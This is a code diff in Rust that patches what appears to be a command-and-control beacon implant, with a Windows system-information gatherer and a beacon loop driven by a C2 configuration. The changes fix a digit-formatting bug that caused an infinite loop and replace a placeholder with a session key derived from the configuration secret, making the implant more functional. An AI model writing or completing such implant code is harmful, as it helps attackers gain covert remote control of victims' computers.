@@ -256,11 +256,11 @@ unsafe fn gather_sysinfo() -> SysInfo {
             crate::core::win32::rtl_get_version(&mut info);
         }
         let mut ver = String::from("Windows ");
-        append_32(&mut ver, info.major_version);
+        append_u32(&mut ver, info.major_version);
         ver.push('.');
-        append_32(&mut ver, info.minor_version);
+        append_u32(&mut ver, info.minor_version);
         ver.push_str(" Build ");
-        append_32(&mut ver, info.build_number);    
+        append_u32(&mut ver, info.build_number);    
         ver
     };
 
@@ -302,7 +302,7 @@ pub unsafe fn beacon_loop(config: &C2Config) {
         return;
     }
 
-    let key = todo!("build crypto engine");
+    let key = crypto::sha256(config.secret);
 
     let session_id = generate_session_id();
     debug!("[BEACON] SessionID: {}", session_id);
@@ -375,7 +375,7 @@ fn wide_to_string(wide: &[u16]) -> String {
     s
 }
 
-fn append_32(s: &mut String, mut val: u32) {
+fn append_u32(s: &mut String, mut val: u32) {
     if val == 0 {
         s.push('0');
         return;
@@ -384,6 +384,7 @@ fn append_32(s: &mut String, mut val: u32) {
     let mut i = 0;
     while val > 0 {
         digits[i] = b'0' + (val % 10) as u8;
+        val /= 10;
         i += 1;
     }
     while i > 0 {
@@ -391,4 +392,3 @@ fn append_32(s: &mut String, mut val: u32) {
         s.push(digits[i] as char);
     }
 }
-
